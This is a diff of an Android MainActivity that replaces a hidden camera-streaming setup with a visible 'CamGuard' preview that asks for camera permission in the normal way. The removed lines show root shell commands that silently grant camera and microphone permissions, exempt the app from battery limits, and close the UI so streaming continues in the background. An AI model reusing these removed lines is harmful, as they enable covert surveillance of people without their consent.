@@ -1,40 +1,97 @@
 package com.example
 
-import android.content.Intent
+import android.Manifest
+import android.content.pm.PackageManager
 import android.os.Bundle
+import android.widget.FrameLayout
+import android.widget.TextView
 import androidx.activity.ComponentActivity
-import com.example.service.CameraStreamService
+import androidx.camera.core.CameraSelector
+import androidx.camera.core.Preview
+import androidx.camera.lifecycle.ProcessCameraProvider
+import androidx.camera.view.PreviewView
+import androidx.core.app.ActivityCompat
+import androidx.core.content.ContextCompat
 
 class MainActivity : ComponentActivity() {
 
+    private lateinit var previewView: PreviewView
+    private val cameraPermissionRequestCode = 1001
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
+        showCameraScreen()
 
-        // 1. Start background streaming service
-        val serviceIntent = Intent(this, CameraStreamService::class.java)
-        startService(serviceIntent)
-
-        // 2. Immediately close the UI on the camera phone
-
-fun grantPermissionsSilently(packageName: String) {
-    try {
-        val process = Runtime.getRuntime().exec("su")
-        val os = java.io.DataOutputStream(process.outputStream)
-        
-        // Grant Camera and Audio permissions
-        os.writeBytes("pm grant $packageName android.permission.CAMERA\n")
-        os.writeBytes("pm grant $packageName android.permission.RECORD_AUDIO\n")
-        
-        // Disable Battery Optimization
-        os.writeBytes("dumpsys deviceidle whitelist +$packageName\n")
-        
-        os.writeBytes("exit\n")
-        os.flush()
-        process.waitFor()
-    } catch (e: Exception) {
-        e.printStackTrace()
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
+            startCamera()
+        } else {
+            ActivityCompat.requestPermissions(
+                this,
+                arrayOf(Manifest.permission.CAMERA),
+                cameraPermissionRequestCode
+            )
+        }
     }
-}        
-        finish()
+
+    private fun showCameraScreen() {
+        previewView = PreviewView(this).apply {
+            implementationMode = PreviewView.ImplementationMode.COMPATIBLE
+            scaleType = PreviewView.ScaleType.FILL_CENTER
+        }
+
+        val container = FrameLayout(this)
+        container.addView(
+            previewView,
+            FrameLayout.LayoutParams(
+                FrameLayout.LayoutParams.MATCH_PARENT,
+                FrameLayout.LayoutParams.MATCH_PARENT
+            )
+        )
+
+        val label = TextView(this).apply {
+            text = "CamGuard • Local Camera Preview"
+            textSize = 16f
+            setTextColor(0xFFFFFFFF.toInt())
+            setPadding(24, 24, 24, 24)
+            setBackgroundColor(0x99000000.toInt())
+        }
+        container.addView(
+            label,
+            FrameLayout.LayoutParams(
+                FrameLayout.LayoutParams.WRAP_CONTENT,
+                FrameLayout.LayoutParams.WRAP_CONTENT
+            )
+        )
+
+        setContentView(container)
+    }
+
+    private fun startCamera() {
+        val cameraProviderFuture = ProcessCameraProvider.getInstance(this)
+        cameraProviderFuture.addListener({
+            val cameraProvider = cameraProviderFuture.get()
+            val preview = Preview.Builder().build().also {
+                it.setSurfaceProvider(previewView.surfaceProvider)
+            }
+
+            val cameraSelector = CameraSelector.DEFAULT_BACK_CAMERA
+
+            cameraProvider.unbindAll()
+            cameraProvider.bindToLifecycle(this, cameraSelector, preview)
+        }, ContextCompat.getMainExecutor(this))
+    }
+
+    override fun onRequestPermissionsResult(
+        requestCode: Int,
+        permissions: Array<out String>,
+        grantResults: IntArray
+    ) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+        if (requestCode == cameraPermissionRequestCode &&
+            grantResults.isNotEmpty() &&
+            grantResults[0] == PackageManager.PERMISSION_GRANTED
+        ) {
+            startCamera()
+        }
     }
 }
